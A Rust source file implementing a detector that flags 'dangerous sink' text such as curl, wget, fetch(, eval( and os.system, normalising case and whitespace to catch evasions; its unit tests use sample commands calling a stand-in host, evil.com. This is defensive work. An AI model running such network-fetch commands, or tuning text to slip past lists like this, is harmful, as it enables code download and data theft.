use aho_corasick::AhoCorasick;

pub const DANGEROUS_SINK_PATTERNS: &[&str] = &[
    "curl",
    "wget",
    "fetch(",
    "http://",
    "https://",
    "subprocess",
    "eval(",
    "exec(",
    "os.system",
];

use std::sync::OnceLock;

static SINK_AC: OnceLock<AhoCorasick> = OnceLock::new();

pub struct DangerousSinkDetector;

impl Default for DangerousSinkDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl DangerousSinkDetector {
    pub fn new() -> Self {
        SINK_AC.get_or_init(|| AhoCorasick::new(DANGEROUS_SINK_PATTERNS).unwrap());
        Self
    }

    pub fn is_dangerous_context(&self, text: &str) -> bool {
        let normalized = Self::normalize_for_sink_check(text);
        SINK_AC.get().unwrap().is_match(&normalized)
    }

    fn normalize_for_sink_check(text: &str) -> String {
        text.to_lowercase()
            .chars()
            .filter(|c| !c.is_whitespace())
            .collect()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_dangerous_sink_detector() {
        let detector = DangerousSinkDetector::new();
        assert!(detector.is_dangerous_context("curl http://evil.com"));
        assert!(detector.is_dangerous_context("wget http://evil.com"));
        assert!(detector.is_dangerous_context("fetch(\"http://evil.com\")"));
        assert!(!detector.is_dangerous_context("Normal text about programming"));
        assert!(detector.is_dangerous_context("c u r l -H"));
        assert!(detector.is_dangerous_context("CuRl"));
        assert!(detector.is_dangerous_context("eval(\"dangerous code\")"));
    }
}
